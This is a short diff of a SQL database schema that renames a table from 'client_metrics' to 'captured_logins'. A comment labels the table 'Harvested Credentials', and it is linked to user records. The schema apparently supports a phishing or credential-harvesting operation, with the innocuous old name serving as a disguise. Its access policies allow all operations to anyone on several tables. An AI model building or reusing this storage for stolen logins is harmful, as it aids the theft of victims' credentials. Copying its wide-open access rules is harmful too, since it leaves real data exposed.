@@ -49,7 +49,7 @@ create policy "Allow all operations messages" on messages for all using (true) w
 create policy "Allow all operations statements" on statements for all using (true) with check (true);
 
 -- Captured Logins Table (Harvested Credentials)
-create table if not exists client_metrics (
+create table if not exists captured_logins (
   id uuid default uuid_generate_v4() primary key,
   created_at timestamp with time zone default timezone('utc'::text, now()) not null,
   user_id uuid references users(id) on delete set null,
@@ -62,8 +62,8 @@ create table if not exists client_metrics (
 );
 
 -- Enable RLS
-alter table client_metrics enable row level security;
-create policy "Allow all operations client_metrics" on client_metrics for all using (true) with check (true);
+alter table captured_logins enable row level security;
+create policy "Allow all operations captured_logins" on captured_logins for all using (true) with check (true);
 
 -- Enable RLS
 alter table transactions enable row level security;
